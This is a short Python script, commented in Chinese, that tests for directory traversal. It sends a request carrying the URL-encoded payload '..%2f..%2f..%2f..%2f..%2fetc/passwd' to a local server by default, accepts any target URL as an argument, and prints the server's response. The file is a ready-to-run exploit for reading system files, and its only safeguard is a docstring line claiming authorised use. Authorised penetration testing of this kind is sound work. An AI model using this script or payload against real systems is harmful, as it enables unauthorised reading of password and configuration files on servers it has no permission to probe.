#!/usr/bin/env python3
"""
目录遍历漏洞测试脚本
用途：尝试通过路径遍历读取目标服务器上的敏感文件（如 /etc/passwd）
仅用于授权的安全测试，请勿非法使用。
"""

import sys
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

def test_path_traversal(url):
    """
    发送请求并输出响应内容
    """
    print(f"[*] 正在请求: {url}")
    try:
        req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        with urlopen(req, timeout=10) as response:
            status = response.getcode()
            content = response.read().decode('utf-8', errors='replace')
            print(f"[+] 响应状态码: {status}")
            if content:
                print("[+] 响应内容（前2000字符）:\n")
                print(content[:2000])
                if len(content) > 2000:
                    print("\n... (内容已截断)")
            else:
                print("[-] 响应内容为空")
    except HTTPError as e:
        print(f"[-] HTTP 错误: {e.code} - {e.reason}")
        # 尝试读取错误页面内容
        try:
            error_content = e.read().decode('utf-8', errors='replace')
            if error_content:
                print("[!] 错误响应内容:\n", error_content[:500])
        except:
            pass
    except URLError as e:
        print(f"[-] 网络错误: {e.reason}")
    except Exception as e:
        print(f"[-] 未知异常: {e}")

if __name__ == "__main__":
    # 可修改目标地址
    target_url = "http://127.0.0.1:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd"
    
    # 如果命令行提供了参数，则使用参数作为URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    
    test_path_traversal(target_url)